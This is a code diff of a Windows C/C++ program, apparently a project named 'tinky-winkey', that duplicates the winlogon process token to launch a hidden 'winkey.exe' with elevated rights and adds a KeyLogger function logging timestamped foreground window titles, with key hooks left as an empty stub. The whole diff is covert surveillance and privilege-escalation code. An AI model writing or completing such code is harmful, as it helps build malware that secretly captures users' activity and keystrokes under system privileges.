@@ -2,14 +2,11 @@
 #include <windows.h>
 #include <process.h>
 #include <Tlhelp32.h>
-#include <winbase.h>
-#include <string.h>
 #include <iostream>
 #include <psapi.h>
+#include <string>
+#include <time.h>
 
-
-
-PROCESS_INFORMATION winkeyPI;
 
 
 DWORD GetPidByName()
@@ -37,8 +34,9 @@ void    Tinky_Winky() {
     HANDLE wlPH;
     HANDLE wlTH;
     HANDLE newExecToken;
+    PROCESS_INFORMATION winkeyPI;
     char Path[260];
-    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+    LPWSTR PP = L"c:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
 
     winlogonPID = GetPidByName();
     wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
@@ -46,7 +44,7 @@ void    Tinky_Winky() {
         printf("opt\n");
     }
     CloseHandle(wlPH);
-    if (!DuplicateTokenEx(wlTH, TOKEN_DUPLICATE, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
+    if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
         printf("dtEx\n");
     }
     CloseHandle(wlTH);
@@ -55,7 +53,39 @@ void    Tinky_Winky() {
     int i = 0;
 
     if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
-        printf("cpwt\n");
+        printf("cpwt (%d)\n", GetLastError());
+    }
+}
+
+void getTime(char **timebuf) {
+    time_t ltime;
+    struct tm  tstruct;
+    char buff[80];
+    ltime = time(0);
+    tstruct = *localtime(&ltime);
+    strftime(buff, sizeof(buff), "%d-%m-%Y %X", &tstruct);
+    strcpy(*timebuf, buff);
+}
+
+void    KeyLogger() {
+    HWND currWindow;
+    char title[256];
+    char* timebuf;
+    timebuf = (char*)malloc(sizeof(char) * 80);
+    while (1) {
+        currWindow = GetForegroundWindow();
+        GetWindowText(currWindow, title, sizeof(title));
+        getTime(&timebuf);
+        printf("[ %s ] - ", timebuf);
+        printf(" '%s'\n", title);
+        while (currWindow == GetForegroundWindow()){
+            ///key hooks
+
+        }
+        getTime(&timebuf);
+        printf("[ %s ] - ", timebuf);
+        printf(" 'window changed'\n");
+        Sleep(200);
     }
 }
 
@@ -65,7 +95,6 @@ int main(int ac, char **av) {
         Tinky_Winky();
         return 0;
     }
-    GetPidByName();
-    while (1);
+    KeyLogger();
     return 0;
 }
